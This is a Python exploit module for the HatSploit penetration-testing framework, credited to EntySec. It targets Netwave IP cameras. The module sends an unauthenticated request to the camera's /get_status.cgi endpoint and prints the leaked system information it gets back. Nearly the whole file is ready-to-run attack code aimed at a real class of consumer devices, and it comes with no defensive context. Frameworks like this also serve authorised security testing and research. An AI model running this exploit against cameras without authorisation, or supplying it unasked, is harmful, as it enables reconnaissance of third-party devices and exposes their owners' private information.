#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import Module
from utils.http.http import HTTPClient
from utils.string.string import StringTools


class HatSploitModule(Module, HTTPClient, StringTools):
    details = {
        'Name': "Netwave IP Camera Information Disclosure",
        'Module': "exploit/multi/netwave_ip_camera/information_disclosure",
        'Authors': [
            'enty8080'
        ],
        'Description': "Netwave IP Camera information disclosure exploit.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Platform': "multi",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 81,
            'Type': "port",
            'Required': True
        }
    }

    def print_formatted_data(self, data):
        data = data.replace(';', '')
        data = data.replace('=', ': ')

        data = data.replace('var', '=>')
        data = data.replace("'", '')

        data = data.split('\n')
        for data_type in data:
            self.output_information(data_type)

    def exploit(self, remote_host, remote_port):
        self.output_process("Searching for information leak...")

        payload = '/get_status.cgi'
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path=payload
        )

        if response is None or response.status_code != 200:
            self.output_error("Exploit failed!")
            return

        self.output_success("Found leaked system information!")
        self.output_information("Leaked system information:")
        self.print_formatted_data(response.text.strip())

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.output_process(f"Exploiting {remote_host}...")
        self.exploit(remote_host, remote_port)
